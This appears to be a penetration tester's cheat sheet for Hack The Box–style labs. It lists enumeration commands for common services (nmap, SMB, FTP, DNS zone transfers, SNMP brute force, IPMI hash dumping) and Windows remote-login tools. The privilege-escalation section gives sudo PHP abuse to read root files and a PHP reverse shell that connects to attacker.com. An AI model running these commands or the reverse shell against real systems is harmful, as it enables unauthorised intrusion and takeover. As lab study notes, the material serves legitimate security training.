# Enumeration 
## Scanning

### All
	nmap -sV <IP>
	All Ports - nmap -sV -sC -p- 10.129.42.253
	Banner Grab - nc -vv -n -w1 <IP> 31337
	Vuln script - sudo nmap <IP> -p <PORT> -sV --script vuln 
	SPORT Masq - sudo nmap <IP> -source-port 53
	
### Web
	nmap -sV --script=http-enum -oA <IP_HTTPENUM> <IP>
	nikto -host http://<IP>
	gobuster dir -u http://<IP> --wordlist /usr/share/dirb/wordlists/common.txt
	Banner Grab - curl -IL https://www.inlanefreight.com
	Webserver version/framework/application - whatweb 10.10.10.121
	^^ but network - whatweb --no-errors 10.10.10.0/24
	
### FTP
	all files - wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
	nc -nv 10.129.14.136 21
	telnet 10.129.14.136 21
	ftp 10.129.14.136
	sudo nmap -sV -p21 -sC -A 10.129.14.136
	encrytped connection - openssl s_client -connect <FQDN/IP>:21 -starttls ftp	
	
### SMB
	Connect to SMB Share - smbclient \\\\10.129.42.253\\users
	Connect to SMB with user - smbclient -U bob \\\\10.129.42.253\\users
	enum4linux-ng.py <FQDN/IP> -A
	SMB Shares 
		crackmapexec smb <FQDN/IP> --shares -u '' -p ''	
		smbmap -H <FQDN/IP>	
		smbclient -N -L \\\\10.129.42.253
		user enum - impacket-samrdump.py <FQDN/IP>
		rpc connect - rpcclient -U "" <FQDN/IP>
			querydominfo
			srvinfo
			netsharegetinfo sambashare
		
### NFS
	showmount -e <FQDN/IP>
	mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock
	umount ./target-NFS
	
### DNS
	Get Seclists - git clone https://github.com/danielmiessler/SecLists
	add dns server such as 1.1.1.1 to /etc/resolv.conf
	gobuster dns - gobuster dns -d inlanefreight.com -w 
	dig ns <domain.tld> @<nameserver>	NS request to the specific nameserver.
	dig any <domain.tld> @<nameserver>	
	dig axfr <domain.tld> @<nameserver
	dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>
	
### SMTP
	telnet <FQDN/IP> 25	
	
### IMAP/POP3
	curl -k 'imaps://<FQDN/IP>' --user <user>:<password>
	openssl s_client -connect <FQDN/IP>:imaps
	openssl s_client -connect <FQDN/IP>:pop3s	
	
### SNMP
	SNMP Public - snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
	SNMP Private - snmpwalk -v 2c -c private  10.129.42.253 
	SNMP Bruteforce - onesixtyone -c dict.txt 10.129.42.254
	snmpwalk -v2c -c <community string> <FQDN/IP>
	onesixtyone -c community-strings.list <FQDN/IP>
	braa <community string>@<FQDN/IP>:.1.*
	
### MySQL
	mysql -u <user> -p<password> -h <FQDN/IP>
	
### MSSQL
	mssqlclient.py <user>@<FQDN/IP> -windows-auth
	
### IPMI
	msf6 auxiliary(scanner/ipmi/ipmi_version)	
	msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)	
	
### Windows
	nbtstat -A <IP>
	nbtscan <IP>
	Eternalblue - nmap --script smb-os-discovery.nse -p445 10.10.10.40
	rdp-sec-check.pl <FQDN/IP>	
	xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>	
	evil-winrm -i <FQDN/IP> -u <user> -p <password>	
	wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"	
	
### Linux
	enum4linux
	ssh-audit.py <FQDN/IP>	
	
# Exploitation
## Web
	Upload Locations
		Apache
		/var/www/html/
		Nginx
		/usr/local/nginx/html/
		IIS
		c:\inetpub\wwwroot\
		XAMPP
		C:\xampp\htdocs\
## Access
	ssh -o
	xfreerdp +clipboard /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!
# Priv Esc
### PHP
	sudo php -r 'echo exec("id");'
	sudo php -r 'echo exec("find /root/*.txt");'
	sudo php -r 'echo exec("cat /root/root.txt");'

	export RHOST=attacker.com
	export RPORT=12345
	sudo php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'

	export CMD="/bin/sh"
	php -r 'system(getenv("CMD"));'

# Post-Exploit 
